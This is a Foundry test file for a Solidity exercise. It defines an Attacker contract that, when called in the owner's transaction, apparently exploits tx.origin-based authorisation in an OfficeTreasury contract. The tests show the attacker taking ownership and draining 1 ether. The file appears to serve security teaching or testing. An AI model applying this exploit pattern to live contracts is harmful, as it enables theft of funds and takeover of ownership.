// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {OfficeTreasury} from "../src/05_OfficeTreasury.sol";

contract Attacker {
    OfficeTreasury public victim;

    constructor(address _victim) {
        victim = OfficeTreasury(_victim);
    }

    function attack(address payable recipient, uint256 amount) public {
        victim.payExpense(recipient, amount);
    }

    function attackChangeOwner(address newOwner) public {
        victim.changeOwner(newOwner);
    }

    receive() external payable {}
}


contract OfficeTreasuryTest is Test {
    OfficeTreasury public victim;
    Attacker public attacker;

    address owner = address(1);
    address attackerEOA = address(2);

    function setUp() public {

        vm.prank(owner);
        victim = new OfficeTreasury();
        vm.deal(address(victim), 10 ether);
        attacker = new Attacker(address(victim));
    }

    function test_changeOwner() public {

        vm.startPrank(owner, owner);
        attacker.attackChangeOwner(attackerEOA);
        vm.stopPrank();

        assertEq(victim.owner(), attackerEOA);
    }

    function test_payExpense() public {

        vm.startPrank(owner, owner);
        attacker.attack(payable(attackerEOA), 1 ether);
        vm.stopPrank();

        assertEq(address(attackerEOA).balance, 1 ether);
        assertEq(address(victim).balance, 9 ether);
    }
}
